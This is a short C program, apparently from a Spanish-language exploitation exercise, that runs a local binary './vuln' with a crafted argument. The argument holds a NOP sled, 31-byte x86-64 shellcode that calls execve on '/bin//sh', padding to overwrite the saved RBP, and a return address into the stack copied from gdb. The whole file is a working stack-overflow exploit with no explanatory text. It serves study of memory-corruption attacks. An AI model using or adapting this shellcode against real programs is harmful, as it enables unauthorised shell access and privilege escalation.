#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main( int argc , char *argv[]) {
    unsigned char payload[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90"              //Nops
    //Shellcode 31 bytes
    "\x48\x31\xc0"                                  //xor    rax,rax
    "\xb0\x3b"                                      //mov    al,0x3b
    "\x48\x31\xff"                                  //xor    rdi,rdi
    "\x57"                                          //push   rdi
    "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      //movabs rdi,0x68732f6e69622f2f
    "\x57"                                          //push   rdi
    "\x48\x89\xe7"                                  //mov    rdi,rsp
    "\x48\x31\xf6"                                  //xor    rsi,rsi
    "\x48\x31\xd2"                                  //xor    rdx,rdx
    "\x0f\x05\x90"                                  //syscall
    "\x90\x90\x90\x90\x90\x90\x90\x90"              //Relleno para llegar a los 64 bytes
    "\x90\x90\x90\x90\x90\x90\x90\x90"              //Sobreescribir RBP
    "\x60\xec\xff\xff\xff\x7f\x00\x00"              //Direccion del buffer, sacada de la ejecucion del programa con gdb
    ;

    char *args[] = {"./vuln",payload,NULL};
    if (execve("./vuln",args,NULL)==-1) perror("Error ejecutando ./vuln\n");
    return (0) ;
}
